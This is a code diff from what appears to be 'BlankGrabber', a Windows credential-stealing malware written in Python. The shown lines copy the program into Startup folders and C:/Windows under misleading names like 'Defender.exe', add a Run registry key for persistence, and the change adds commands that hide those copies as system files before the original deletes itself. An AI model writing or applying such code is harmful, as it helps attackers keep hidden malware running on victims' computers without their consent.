@@ -327,7 +327,14 @@ if __name__ == "__main__":
                         BlankGrabber.copy('BlankGrabber', sys.executable, "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe")
                         BlankGrabber.copy('BlankGrabber', sys.executable, "C:/Windows/dcsconfig.exe")
                         os.system('REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "Cloud" /t REG_SZ /F /D "C:/Windows/dcsconfig.exe"')
-                        os.remove(sys.executable)
+                        try:
+                            os.system(f"attrib {os.getenv('USERPROFILE')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Defender.exe +h +s")
+                            os.system("attrib C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/dconfig.exe +h +s")
+                            os.system("attrib C:/Windows/dcsconfig.exe +h +s")
+                        except Exception:
+                            pass
+                        finally:
+                            os.remove(sys.executable)
                 except Exception:
                     pass
             BlankGrabber()
